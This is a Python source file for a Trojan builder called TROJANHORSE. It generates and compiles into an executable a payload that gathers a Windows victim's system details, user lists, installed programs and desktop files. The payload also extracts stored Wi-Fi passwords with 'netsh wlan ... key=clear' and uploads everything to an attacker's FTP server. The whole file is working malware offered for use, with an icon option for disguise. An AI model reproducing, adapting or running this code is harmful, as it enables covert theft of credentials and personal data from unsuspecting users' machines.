import os
import PyInstaller
import json


pythonstart=r'''import platform
import os
import re
import socket
from ftplib import FTP
class G:
    def wifiT(url):
        try:
            host = socket.gethostbyname(url)
            s = socket.create_connection((host, 80), 2)
            return True
        except Exception as e:
            return False
def go(file,file2):
    ftp = FTP(encoding="gbk")
    ftp.connect("IP", 端口)
    ftp.login("用户名","密码")
    ftp.cwd("cwdfile")
    fp = open(str(file), "rb")
    cmd = "STOR "+file2
    ftp.storbinary(cmd, fp, 1024)
    ftp.quit()
def Computer_data(get=str):
    #计算机的网络名称
    node=platform.node()
    #获取操作系统名称及版本号
    platformstr=platform.platform()
    #计算机处理器信息
    processor=platform.processor()
    #获取系统类型,，如windows
    system=platform.system()
    #获取系统盘
    winpath = os.environ["WINDIR"][:-7]
    #获取用户列表
    Users=os.listdir(winpath+"Users")
    #获取应用列表
    Program_Filesx86=os.listdir(winpath+"Program Files (x86)")
    #获取系统应用列表
    Program_Files=os.listdir(winpath+"Program Files")
    #获取temp缓存目录
    temp=os.environ["temp"]
    #获取当前用户
    Userspath=os.environ["USERPROFILE"]
    #获取当前桌面文件
    Desktop=os.listdir(Userspath+r"\Desktop")
    #获取Fonts字体
    Fonts=os.listdir(winpath+r"windows\Fonts")
    #获取是否联网
    wifi=G.wifiT(url="www.baidu.com")
    if get == "node":
        return node
    elif get == "platformstr":
        return platformstr
    elif get == "processor":
        return processor
    elif get == "system":
        return system
    elif get == "winpath":
        return winpath
    elif get == "Users":
        return Users
    elif get == "Program_Filesx86":
        return Program_Filesx86
    elif get == "Program_Files":
        return Program_Files
    elif get == "Userspath":
        return Userspath
    elif get == "Desktop":
        return Desktop
    elif get == "Fonts":
        return Fonts
    elif get == "wifi":
        if wifi == True:
            a=os.popen("netsh wlan show profiles")
            b=a.read()
            c=re.findall("所有用户配置文件 : (.*?)\n    所有用户配置文件",b,re.S)
            i=c[0]
            a=os.popen("netsh wlan show profiles " +i+ " key=clear")
            b=a.read()
            c=re.findall("关键内容            : (.*?)\n\n费用设置",b,re.S)
        return (str(wifi)+"\nwifi名称: "+str(i)+"\nwifi密码: "+str(c))
    else:
        return None
f=open("get.txt","w",encoding="UTF-8")
f.write(
    "---Start---"+
    "\n电脑网络名称: "+str(Computer_data(get="node"))+
    "\n电脑操作系统名称;版本号: "+str(Computer_data(get="platformstr"))+
    "\n获取计算机处理器信息: "+str(Computer_data(get="processor"))+
    "\n获取系统类型: "+str(Computer_data(get="system"))+
    "\n获取系统盘位置: "+str(Computer_data(get="winpath"))+
    "\n获取用户列表: "+str(Computer_data(get="Users"))+
    "\n获取应用列表: "+str(Computer_data(get="Program_Filesx86"))+
    "\n获取系统应用列表: "+str(Computer_data(get="Program_Files"))+
    "\n获取当前用户: "+str(Computer_data(get="Userspath"))+
    "\n获取当前用户桌面文件: "+str(Computer_data(get="Desktop"))+
    "\n获取字体库文件: "+str(Computer_data(get="Fonts"))+
    "\n获取当前电脑网络连接状态: "+str(Computer_data(get="wifi"))+
    "\n---End---"
)
f.close()

'''


pythonend='''

if G.wifiT(url="www.baidu.com") == True:
    go("get.txt","get.txt")

    '''

pythonwifiend='''
if G.wifiT(url="www.baidu.com") == False:

    
'''



class pythonimport(object):
    def __init__(self):
        self.pythonstart=pythonstart
        self.pythonend=pythonend
        self.pythonwifiend=pythonwifiend
    def ico(self,icofile):
        self.ico=icofile
    def wifiwrite(self,wifiwrite):
        self.textwifiwrite=wifiwrite

    def notwifiwrite(self,notwifiwrite="None"):
        self.textnotwifiwrite=notwifiwrite
    def wifiend(self,textendwifi="None"):
        self.textendwifi=textendwifi
    def FTP(self,FTPIP,FTPPort,Users,passwd,cd,echo):
        self.FTPIP=FTPIP
        self.FTPPort=FTPPort
        self.Users=Users
        self.passwd=passwd
        self.cd=cd
        self.echo=echo
    def start(self):
        print("准备开始执行")
        self.textwifiwrite=str("\n"+self.textwifiwrite).replace("\n","\n    ")
        self.textendwifi=str("\n"+self.textendwifi).replace("\n","\n    ")
        self.python=self.pythonstart+self.textnotwifiwrite+self.pythonend+self.textwifiwrite+self.pythonwifiend+self.textendwifi
        self.python=str(self.python)
        self.python=self.python.replace("IP",self.FTPIP)
        self.python=self.python.replace("端口",self.FTPPort)
        self.python=self.python.replace("用户名",self.Users)
        self.python=self.python.replace("密码",self.passwd)
        self.python=self.python.replace("cwdfile",self.cd)
        print("FTP服务器信息:")
        print("IP: "+self.FTPIP)
        print("端口: "+self.FTPPort)
        if self.echo == 0:
            print("用户名: "+self.Users)
            print("密码: "+self.passwd)
        else:
            print("用户名: ***")
            print("密码: ***")
        print("服务器CD: "+self.cd)
        dir="TROJANHORSEOutput"
        def mkdir():
            if os.path.exists(dir) == False:
                os.mkdir(dir)
                print("创建文件夹")
        mkdir()
        def pingFTP():
            def importpyinstall():
                try:
                    os.system("pyinstaller")
                except:
                    return "NO"
                return "YES"
            def go(file,file2):
                try:
                    from ftplib import FTP
                    ftp = FTP(encoding="gbk")
                    ftp.connect(self.FTPIP, self.FTPPort)
                    ftp.login(self.Users,self.passwd)
                    fp = open(str(file), "rb")
                    cmd = "STOR "+file2
                    ftp.storbinary(cmd, fp, 1024)
                    ftp.quit()
                except:
                    return False
                return True
            f=open("./TROJANHORSEOutput/Testing.txt","w",encoding="UTF-8")
            f.write("你好,我是python的TROJANHORSE模块\n我需要测试您的FTP服务器通不通\n如果您在服务器上看见了这个文件\n说明FTP通了\n如果您没有在TROJANHORSE使用功能\n那就可能是外人恶意选中您的服务器\n请更改密码")
            f.close()
            if go("./TROJANHORSEOutput/Testing.txt","Testing.txt") and importpyinstall():
                return True
            return False
        if pingFTP() == False:
            return "The FTP server is inaccessible"
        print("pyinstaller可以运行,FTP服务器连接成功")
        f=open("./"+dir+"/TROJANHORSE.pyw","w",encoding="UTF-8")
        f.write(self.python)
        f.close()

        f=open("./"+dir+"/Versioninformation.txt","w",encoding="UTF-8")
        f.write("TROJANHORSE Version information:V1.0")
        f.close()

        f=open("./"+dir+"/Servicenotification.txt","w",encoding="UTF-8")
        f.write("你好,我是python的TROJANHORSE的创始人,感谢您使用TROJANHORSE\n请您务必不要将TROJANHORSE核心代码上传\n我可是个暗网监控者,您上传到哪里我都能找到\n如果您将TROJANHORSE核心源码使用于非法(但不仅限于)或商业(不包括已经打包的exe)目的,\n我们绝不允许!!!\n请您注意不要擅自修改TROJANHORSE代码(除取掉繁琐代码,如print)\n如果您对TROJANHORSE相关产品有兴趣,或想要成为开发者,我们欢迎\n网站:http://wytyh.3vcm.vip")
        f.close()

        stus = {"ico":self.ico,"FTP":{"IP":self.FTPIP,"Port":self.FTPPort,"Users":self.Users,"passwd":self.passwd},"TROJANHORSE":{"V":"1.0","pyinstaller":PyInstaller.__version__}}
        res2 = json.dumps(stus,indent=4)
        print(stus)
        f=open("./"+dir+"/TROJANHORSE.json","w",encoding="UTF-8")
        f.write(res2)
        f.close()

        os.chdir(dir)
        print("准备生成exe")
        os.system("pyinstaller -F TROJANHORSE.pyw -i "+self.ico)
        print("生成完毕")